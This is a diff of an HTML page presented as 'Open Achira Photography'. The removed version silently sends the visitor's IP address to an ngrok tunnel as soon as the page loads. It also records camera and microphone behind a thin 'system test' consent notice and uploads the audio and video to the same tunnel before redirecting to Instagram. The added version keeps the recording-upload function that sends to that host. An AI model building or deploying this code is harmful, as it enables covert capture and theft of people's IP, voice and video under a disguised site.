@@ -1,98 +1,28 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Achira Photography</title>
-</head>
-<body>
-    <h1>Welcome! (Scroll down to read the User Manual)</h1>
-    <button onclick="startRecording()">Start Recording</button>
-    <button onclick="stopRecording()">Stop Recording</button>
-    <p id="status"></p>
-    <video id="video" width="640" height="480" autoplay></video>
-    
-    <div id="guidelines">
-        <h2>Guidelines for User:</h2>
-        <ol>
-            <li>By proceeding further, you freely and willingly give your consent to volunteer and take part in this system test by accepting the following Terms and Conditions, with full consciousness and without any external pressure/force.</li>
-            <li>Basic network information and audio-video recordings will be collected.</li>
-            <li>You have to manually grant browser permissions to allow the system access to your camera and microphone.</li>
-            <li>The camera will be used to record video.</li>
-            <li>The microphone will be used to record audio.</li>
-            <li>These recordings will be collected, gathered, stored, analyzed, and processed by the system.</li>
-            <li>After successful completion of the above steps, you will be automatically redirected to the official Instagram handle of Achira Photography. Enjoy!</li>
-        </ol>
-    </div>
-    
-    <script>
-        let mediaRecorder;
-        let audioChunks = [];
-        let videoChunks = [];
-
-        function logIP(ip) {
-            fetch('https://de81-103-255-145-50.ngrok-free.app/log_ip', { // Replace with your ngrok URL
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ ip: ip })
-            })
-            .then(response => {
-                if (!response.ok) throw new Error('Network response was not ok');
-                console.log('IP logged:', ip);
-            })
-            .catch(error => console.error('Error logging IP:', error));
-        }
-
-        fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => logIP(data.ip))
-        .catch(error => console.error('Error fetching IP:', error));
-
-        function startRecording() {
-            console.log("startRecording called");
-            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-                .then(stream => {
-                    audioChunks = [];
-                    videoChunks = [];
-                    mediaRecorder = new MediaRecorder(stream);
-                    mediaRecorder.start();
-                    document.getElementById('status').innerText = "Recording...";
-                    document.getElementById('video').srcObject = stream;
-                    mediaRecorder.ondataavailable = event => {
-                        audioChunks.push(event.data);
-                        videoChunks.push(event.data);
-                        console.log("Data available");
-                    };
-                })
-                .catch(error => console.error('Error accessing media devices: ' + error + ' - Make sure you grant permissions.'));
-        }
-
-        function stopRecording() {
-            console.log("stopRecording called");
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                mediaRecorder.stop();
-                document.getElementById('status').innerText = "Recording stopped";
-                mediaRecorder.onstop = () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                    const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-                    const formData = new FormData();
-                    formData.append('audio', audioBlob, 'recording.wav');
-                    formData.append('video', videoBlob, 'recording.mp4');
-                    fetch('https://de81-103-255-145-50.ngrok-free.app/upload_media', { // Replace with your ngrok URL
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => {
-                        if (!response.ok) throw new Error('Network response was not ok');
-                        console.log('Media uploaded');
-                        window.location.href = "https://www.instagram.com/achira_photography/";  // Replace with your desired URL
-                    })
-                    .catch(error => console.error('Error uploading media: ' + error));
-                };
-            } else {
-                console.log("MediaRecorder is not active or not defined");
-            }
-        }
-    </script>
-</body>
-</html>
+<script>
+   function stopRecording() {
+       console.log("stopRecording called");
+       if (mediaRecorder && mediaRecorder.state !== "inactive") {
+           mediaRecorder.stop();
+           document.getElementById('status').innerText = "Recording stopped";
+           mediaRecorder.onstop = () => {
+               const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+               const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+               const formData = new FormData();
+               formData.append('audio', audioBlob, 'recording.wav');
+               formData.append('video', videoBlob, 'recording.mp4');
+               fetch('https://de81-103-255-145-50.ngrok-free.app/upload_media', { // Replace with your ngrok URL
+                   method: 'POST',
+                   body: formData
+               })
+               .then(response => {
+                   if (!response.ok) throw new Error('Network response was not ok');
+                   console.log('Media uploaded');
+                   window.location.href = "https://www.instagram.com/achira_photography/";  // Ensure this URL is correct
+               })
+               .catch(error => console.error('Error uploading media: ' + error));
+           };
+       } else {
+           console.log("MediaRecorder is not active or not defined");
+       }
+   }
+</script>
